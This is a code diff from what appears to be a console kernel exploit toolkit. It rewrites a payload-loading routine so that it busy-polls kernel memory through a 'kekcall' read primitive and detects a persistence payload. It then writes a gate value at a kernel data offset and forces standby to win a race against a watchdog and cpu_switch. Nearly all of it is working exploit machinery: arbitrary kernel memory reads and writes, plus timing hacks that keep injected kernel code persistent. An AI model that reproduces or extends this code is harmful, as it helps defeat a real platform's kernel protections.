@@ -127,44 +127,32 @@ static void _kldload(void* data, size_t data_size)
      * Check the status field (first uint32 at offset 4) every 500ms.
      * SRCP payloads set status=0xAAAA while capturing and change to
      * 1 (armed) or 0xFF (error) when done. Other payloads just get
-     * a generous timeout. */
+     * a generous timeout.
+     *
+     * PCBO FAST PATH: busy-poll (no sleep) to detect magic ASAP.
+     * The kernel thread writes pcb_rip once and exits — we need to
+     * detect completion and call standby before cpu_switch overwrites
+     * pcb_rip. Every microsecond counts. */
     {
         int completed = 0;
-        for (int poll = 0; poll < 60; poll++) { /* up to 30s */
-            usleep(500000); /* 500ms */
+
+        /* PCBO fast path: busy-poll via kekcall for ~5 seconds.
+         * Each kekcall takes ~50-100μs (syscall overhead), so this
+         * gives us ~50K-100K polls in 5 seconds. */
+        for (int bpoll = 0; bpoll < 100000; bpoll++) {
             uint64_t word0 = kekcall_read_kmem(5, kthread_args);
             uint32_t magic_chk = (uint32_t)(word0 & 0xFFFFFFFF);
-            uint32_t status_chk = (uint32_t)(word0 >> 32);
 
-            if (magic_chk == 0x53524350) { /* SRCP */
-                if (status_chk != 0xAAAA) {
-                    printf("[debug] SRCP completed (status=%#x) after %d.%ds\n",
-                           status_chk, (poll + 1) / 2, ((poll + 1) % 2) * 5);
-                    completed = 1;
-                    break;
-                }
-                if (poll % 4 == 3)
-                    printf("[debug] SRCP still capturing... (%d.%ds elapsed)\n",
-                           (poll + 1) / 2, ((poll + 1) % 2) * 5);
-            } else if (magic_chk == 0x5043424F) { /* PCBO — fast-track */
-                /* PCBO kernel thread is running a persistence loop that may
-                 * trigger a watchdog after ~3-5 seconds. Read only what we
-                 * need (phase + kdata_base) and if phase==1, immediately
-                 * set gate=1 and enter standby — no readback, no printing. */
+            if (magic_chk == 0x5043424F) { /* PCBO detected */
                 uint64_t phase_word = kekcall_read_kmem(5, kthread_args + 3 * 8);
-                uint64_t pcbo_phase = phase_word;
 
-                printf("[PCBO] detected after %d.%ds, phase=%lu\n",
-                       (poll + 1) / 2, ((poll + 1) % 2) * 5, pcbo_phase);
-                fflush(stdout);
-
-                if (pcbo_phase == 1) {
-                    /* Armed — race the watchdog! */
+                if (phase_word == 1) {
+                    /* Armed — immediately gate + standby */
                     uint64_t kdata_base_val = kekcall_read_kmem(5, kthread_args + 1 * 8);
                     uint64_t gate_addr = kdata_base_val + 0x460;
 
-                    printf("[PCBO] FAST-TRACK: gate=1 + standby NOW (kdata=%#lx)\n",
-                           kdata_base_val);
+                    printf("[PCBO] armed! gate=1 + standby NOW (poll #%d, kdata=%#lx)\n",
+                           bpoll, kdata_base_val);
                     fflush(stdout);
 
                     uint64_t gate_val = 1;
@@ -172,29 +160,50 @@ static void _kldload(void* data, size_t data_size)
 
                     int sret = sceSystemStateMgrEnterStandby();
                     printf("[PCBO] sceSystemStateMgrEnterStandby() returned %d\n", sret);
-                    if (sret != 0) {
+                    if (sret != 0)
                         printf("[PCBO] AUTO-STANDBY FAILED (ret=%d). Enter rest mode MANUALLY!\n", sret);
-                    }
                     fflush(stdout);
-                    /* Don't bother with readback — console is going to sleep */
                     return;
                 }
-                /* phase != 1 (dry run or phase 2) — fall through to normal readback */
-                usleep(500000); /* brief settle */
-                printf("[debug] PCBO non-armed phase, doing full readback\n");
+                /* Non-armed (dry run / phase 2) — fall through to normal */
+                printf("[PCBO] detected phase=%lu, doing full readback\n", phase_word);
                 completed = 1;
                 break;
             } else if (magic_chk != 0) {
-                /* Non-SRCP/non-PCBO payload wrote its magic — give it 1 more second */
-                usleep(1000000);
-                printf("[debug] payload completed (magic=%#x) after %d.%ds\n",
-                       magic_chk, (poll + 1) / 2 + 1, ((poll + 1) % 2) * 5);
-                completed = 1;
+                /* Non-PCBO payload — break to normal slow-poll path */
                 break;
             }
         }
-        if (!completed)
-            printf("[debug] timeout waiting for payload (30s)\n");
+
+        /* Normal slow-poll path for non-PCBO payloads */
+        if (!completed) {
+            for (int poll = 0; poll < 60; poll++) { /* up to 30s */
+                usleep(500000); /* 500ms */
+                uint64_t word0 = kekcall_read_kmem(5, kthread_args);
+                uint32_t magic_chk = (uint32_t)(word0 & 0xFFFFFFFF);
+                uint32_t status_chk = (uint32_t)(word0 >> 32);
+
+                if (magic_chk == 0x53524350) { /* SRCP */
+                    if (status_chk != 0xAAAA) {
+                        printf("[debug] SRCP completed (status=%#x) after %d.%ds\n",
+                               status_chk, (poll + 1) / 2, ((poll + 1) % 2) * 5);
+                        completed = 1;
+                        break;
+                    }
+                    if (poll % 4 == 3)
+                        printf("[debug] SRCP still capturing... (%d.%ds elapsed)\n",
+                               (poll + 1) / 2, ((poll + 1) % 2) * 5);
+                } else if (magic_chk != 0) {
+                    usleep(1000000);
+                    printf("[debug] payload completed (magic=%#x) after %d.%ds\n",
+                           magic_chk, (poll + 1) / 2 + 1, ((poll + 1) % 2) * 5);
+                    completed = 1;
+                    break;
+                }
+            }
+            if (!completed)
+                printf("[debug] timeout waiting for payload (30s)\n");
+        }
     }
 
     /* Read back results from kthread_args */
